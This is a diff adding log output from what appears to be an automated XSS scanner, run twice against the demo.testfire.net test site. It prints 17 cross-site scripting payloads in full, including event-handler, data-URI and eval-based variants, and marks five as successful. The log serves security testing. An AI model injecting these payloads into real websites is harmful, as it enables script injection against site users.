@@ -1,0 +1,170 @@
+
+Log started on 2024-11-19 16:16:40.284994
+════════════════════════════════════════════════════════════════════════════════
+Starting XSS Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-19 16:16:13] Starting XSS scan on https://demo.testfire.net/
+[DEBUG] [2024-11-19 16:16:13] Testing payload: Alert-based payload
+[SUCCESS] [2024-11-19 16:16:14] XSS vulnerability found with payload: Alert-based payload
+[DEBUG] [2024-11-19 16:16:14] Testing payload: Image onerror event
+[SUCCESS] [2024-11-19 16:16:15] XSS vulnerability found with payload: Image onerror event
+[DEBUG] [2024-11-19 16:16:15] Testing payload: SVG onload event
+[SUCCESS] [2024-11-19 16:16:16] XSS vulnerability found with payload: SVG onload event
+[DEBUG] [2024-11-19 16:16:16] Testing payload: JavaScript URI
+[WARNING] [2024-11-19 16:16:20] Payload failed: JavaScript URI
+[DEBUG] [2024-11-19 16:16:20] Testing payload: Attribute breaking (single quote)
+[WARNING] [2024-11-19 16:16:24] Payload failed: Attribute breaking (single quote)
+[DEBUG] [2024-11-19 16:16:24] Testing payload: Attribute breaking (double quote)
+[WARNING] [2024-11-19 16:16:27] Payload failed: Attribute breaking (double quote)
+[DEBUG] [2024-11-19 16:16:27] Testing payload: CSS expression
+[WARNING] [2024-11-19 16:16:31] Payload failed: CSS expression
+[DEBUG] [2024-11-19 16:16:31] Testing payload: Meta refresh
+[WARNING] [2024-11-19 16:16:35] Payload failed: Meta refresh
+[DEBUG] [2024-11-19 16:16:35] Testing payload: Body onload event
+[SUCCESS] [2024-11-19 16:16:36] XSS vulnerability found with payload: Body onload event
+[DEBUG] [2024-11-19 16:16:36] Testing payload: Input onfocus event
+[SUCCESS] [2024-11-19 16:16:37] XSS vulnerability found with payload: Input onfocus event
+[DEBUG] [2024-11-19 16:16:37] Testing payload: Iframe src
+[WARNING] [2024-11-19 16:16:37] Payload failed: Iframe src
+[DEBUG] [2024-11-19 16:16:37] Testing payload: Data URI
+[WARNING] [2024-11-19 16:16:37] Payload failed: Data URI
+[DEBUG] [2024-11-19 16:16:37] Testing payload: HTML5 video tag
+[WARNING] [2024-11-19 16:16:37] Payload failed: HTML5 video tag
+[DEBUG] [2024-11-19 16:16:37] Testing payload: Markdown XSS
+[WARNING] [2024-11-19 16:16:37] Payload failed: Markdown XSS
+[DEBUG] [2024-11-19 16:16:37] Testing payload: Script tag with XML data
+[WARNING] [2024-11-19 16:16:37] Payload failed: Script tag with XML data
+[DEBUG] [2024-11-19 16:16:37] Testing payload: Unicode escape sequences
+[WARNING] [2024-11-19 16:16:38] Payload failed: Unicode escape sequences
+[DEBUG] [2024-11-19 16:16:38] Testing payload: DOM-based XSS
+[WARNING] [2024-11-19 16:16:38] Payload failed: DOM-based XSS
+[INFO] [2024-11-19 16:16:38] Scan complete. Found 5 vulnerabilities
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-19 16:16:38] Total tests conducted: 17
+[INFO] [2024-11-19 16:16:38] Successful XSS injections: 5
+[INFO] [2024-11-19 16:16:38] Failed XSS injections: 12
+[SUCCESS] [2024-11-19 16:16:38] === Successful XSS Payloads ===
+[SUCCESS] [2024-11-19 16:16:38] Name: Alert-based payload
+Payload: <script>alert('XSS alert');</script>
+[SUCCESS] [2024-11-19 16:16:38] Name: Image onerror event
+Payload: <img src=x onerror="alert('XSS alert')">
+[SUCCESS] [2024-11-19 16:16:38] Name: SVG onload event
+Payload: <svg onload="alert('XSS alert')">
+[SUCCESS] [2024-11-19 16:16:38] Name: Body onload event
+Payload: <body onload="alert('XSS alert')">
+[SUCCESS] [2024-11-19 16:16:38] Name: Input onfocus event
+Payload: <input type="text" onfocus="alert('XSS alert')" autofocus>
+[WARNING] [2024-11-19 16:16:38] === Failed XSS Payloads ===
+[WARNING] [2024-11-19 16:16:38] Name: JavaScript URI
+Payload: javascript:alert('XSS alert')
+[WARNING] [2024-11-19 16:16:38] Name: Attribute breaking (single quote)
+Payload: ' onmouseover="alert('XSS alert')" '
+[WARNING] [2024-11-19 16:16:38] Name: Attribute breaking (double quote)
+Payload: " onmouseover="alert('XSS alert')" "
+[WARNING] [2024-11-19 16:16:38] Name: CSS expression
+Payload: <div style="width: expression(alert('XSS alert'));">
+[WARNING] [2024-11-19 16:16:38] Name: Meta refresh
+Payload: <meta http-equiv="refresh" content="0;url=javascript:alert('XSS alert')">
+[WARNING] [2024-11-19 16:16:38] Name: Iframe src
+Payload: <iframe src="javascript:alert('XSS alert')"></iframe>
+[WARNING] [2024-11-19 16:16:38] Name: Data URI
+Payload: <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGFsZXJ0Jyk8L3NjcmlwdD4=">Click me</a>
+[WARNING] [2024-11-19 16:16:38] Name: HTML5 video tag
+Payload: <video><source onerror="alert('XSS alert')">
+[WARNING] [2024-11-19 16:16:38] Name: Markdown XSS
+Payload: [a](javascript:alert('XSS alert'))
+[WARNING] [2024-11-19 16:16:38] Name: Script tag with XML data
+Payload: <script>x='<script>alert("XSS alert")</script>'</script>
+[WARNING] [2024-11-19 16:16:38] Name: Unicode escape sequences
+Payload: <script>\u0061lert('XSS alert')</script>
+[WARNING] [2024-11-19 16:16:38] Name: DOM-based XSS
+Payload: <script>eval(location.hash.slice(1))</script>#alert('XSS alert')
+════════════════════════════════════════════════════════════════════════════════
+════════════════════════════════════════════════════════════════════════════════
+
+Log started on 2024-11-19 17:40:55.861880
+════════════════════════════════════════════════════════════════════════════════
+Starting XSS Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-19 17:40:33] Starting XSS scan on https://demo.testfire.net/
+[DEBUG] [2024-11-19 17:40:33] Testing payload: Alert-based payload
+[SUCCESS] [2024-11-19 17:40:33] XSS vulnerability found with payload: Alert-based payload
+[DEBUG] [2024-11-19 17:40:33] Testing payload: Image onerror event
+[SUCCESS] [2024-11-19 17:40:34] XSS vulnerability found with payload: Image onerror event
+[DEBUG] [2024-11-19 17:40:34] Testing payload: SVG onload event
+[SUCCESS] [2024-11-19 17:40:35] XSS vulnerability found with payload: SVG onload event
+[DEBUG] [2024-11-19 17:40:35] Testing payload: JavaScript URI
+[WARNING] [2024-11-19 17:40:38] Payload failed: JavaScript URI
+[DEBUG] [2024-11-19 17:40:38] Testing payload: Attribute breaking (single quote)
+[WARNING] [2024-11-19 17:40:41] Payload failed: Attribute breaking (single quote)
+[DEBUG] [2024-11-19 17:40:41] Testing payload: Attribute breaking (double quote)
+[WARNING] [2024-11-19 17:40:45] Payload failed: Attribute breaking (double quote)
+[DEBUG] [2024-11-19 17:40:45] Testing payload: CSS expression
+[WARNING] [2024-11-19 17:40:48] Payload failed: CSS expression
+[DEBUG] [2024-11-19 17:40:48] Testing payload: Meta refresh
+[WARNING] [2024-11-19 17:40:52] Payload failed: Meta refresh
+[DEBUG] [2024-11-19 17:40:52] Testing payload: Body onload event
+[SUCCESS] [2024-11-19 17:40:52] XSS vulnerability found with payload: Body onload event
+[DEBUG] [2024-11-19 17:40:52] Testing payload: Input onfocus event
+[SUCCESS] [2024-11-19 17:40:53] XSS vulnerability found with payload: Input onfocus event
+[DEBUG] [2024-11-19 17:40:53] Testing payload: Iframe src
+[WARNING] [2024-11-19 17:40:53] Payload failed: Iframe src
+[DEBUG] [2024-11-19 17:40:53] Testing payload: Data URI
+[WARNING] [2024-11-19 17:40:53] Payload failed: Data URI
+[DEBUG] [2024-11-19 17:40:53] Testing payload: HTML5 video tag
+[WARNING] [2024-11-19 17:40:53] Payload failed: HTML5 video tag
+[DEBUG] [2024-11-19 17:40:53] Testing payload: Markdown XSS
+[WARNING] [2024-11-19 17:40:53] Payload failed: Markdown XSS
+[DEBUG] [2024-11-19 17:40:53] Testing payload: Script tag with XML data
+[WARNING] [2024-11-19 17:40:53] Payload failed: Script tag with XML data
+[DEBUG] [2024-11-19 17:40:53] Testing payload: Unicode escape sequences
+[WARNING] [2024-11-19 17:40:53] Payload failed: Unicode escape sequences
+[DEBUG] [2024-11-19 17:40:53] Testing payload: DOM-based XSS
+[WARNING] [2024-11-19 17:40:53] Payload failed: DOM-based XSS
+[INFO] [2024-11-19 17:40:53] Scan complete. Found 5 vulnerabilities
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-19 17:40:53] Total tests conducted: 17
+[INFO] [2024-11-19 17:40:53] Successful XSS injections: 5
+[INFO] [2024-11-19 17:40:53] Failed XSS injections: 12
+[SUCCESS] [2024-11-19 17:40:53] === Successful XSS Payloads ===
+[SUCCESS] [2024-11-19 17:40:53] Name: Alert-based payload
+Payload: <script>alert('XSS alert');</script>
+[SUCCESS] [2024-11-19 17:40:53] Name: Image onerror event
+Payload: <img src=x onerror="alert('XSS alert')">
+[SUCCESS] [2024-11-19 17:40:53] Name: SVG onload event
+Payload: <svg onload="alert('XSS alert')">
+[SUCCESS] [2024-11-19 17:40:53] Name: Body onload event
+Payload: <body onload="alert('XSS alert')">
+[SUCCESS] [2024-11-19 17:40:53] Name: Input onfocus event
+Payload: <input type="text" onfocus="alert('XSS alert')" autofocus>
+[WARNING] [2024-11-19 17:40:53] === Failed XSS Payloads ===
+[WARNING] [2024-11-19 17:40:53] Name: JavaScript URI
+Payload: javascript:alert('XSS alert')
+[WARNING] [2024-11-19 17:40:53] Name: Attribute breaking (single quote)
+Payload: ' onmouseover="alert('XSS alert')" '
+[WARNING] [2024-11-19 17:40:53] Name: Attribute breaking (double quote)
+Payload: " onmouseover="alert('XSS alert')" "
+[WARNING] [2024-11-19 17:40:53] Name: CSS expression
+Payload: <div style="width: expression(alert('XSS alert'));">
+[WARNING] [2024-11-19 17:40:53] Name: Meta refresh
+Payload: <meta http-equiv="refresh" content="0;url=javascript:alert('XSS alert')">
+[WARNING] [2024-11-19 17:40:53] Name: Iframe src
+Payload: <iframe src="javascript:alert('XSS alert')"></iframe>
+[WARNING] [2024-11-19 17:40:53] Name: Data URI
+Payload: <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGFsZXJ0Jyk8L3NjcmlwdD4=">Click me</a>
+[WARNING] [2024-11-19 17:40:53] Name: HTML5 video tag
+Payload: <video><source onerror="alert('XSS alert')">
+[WARNING] [2024-11-19 17:40:53] Name: Markdown XSS
+Payload: [a](javascript:alert('XSS alert'))
+[WARNING] [2024-11-19 17:40:53] Name: Script tag with XML data
+Payload: <script>x='<script>alert("XSS alert")</script>'</script>
+[WARNING] [2024-11-19 17:40:53] Name: Unicode escape sequences
+Payload: <script>\u0061lert('XSS alert')</script>
+[WARNING] [2024-11-19 17:40:53] Name: DOM-based XSS
+Payload: <script>eval(location.hash.slice(1))</script>#alert('XSS alert')
+════════════════════════════════════════════════════════════════════════════════
+════════════════════════════════════════════════════════════════════════════════
